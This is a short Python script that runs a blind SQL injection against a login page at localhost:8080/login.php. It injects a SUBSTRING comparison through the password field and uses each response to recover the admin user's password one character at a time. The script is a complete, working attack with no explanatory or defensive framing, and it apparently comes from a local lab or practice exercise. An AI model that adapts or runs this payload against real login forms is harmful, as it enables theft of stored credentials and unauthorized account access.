import requests

def is_success(r):
  return 'login success' in r.text

print("scanning...")

msg = ""
idx = 1
while True:
  val = 0x00
  while True:
    payload = {
      'id':       'admin',
      'password': f"' OR SUBSTRING((SELECT password FROM users WHERE username='admin'), {idx}, 1) <= binary '{chr(val)}'-- "
    }
    r = requests.post('http://localhost:8080/login.php', data=payload)

    if is_success(r):
      break

    val += 1

  c = chr(val)
  print(c, end='', flush=True)

  if (c == '\0'):
    break

  msg += c
  idx += 1

print('\n')
print(f"message: {msg}")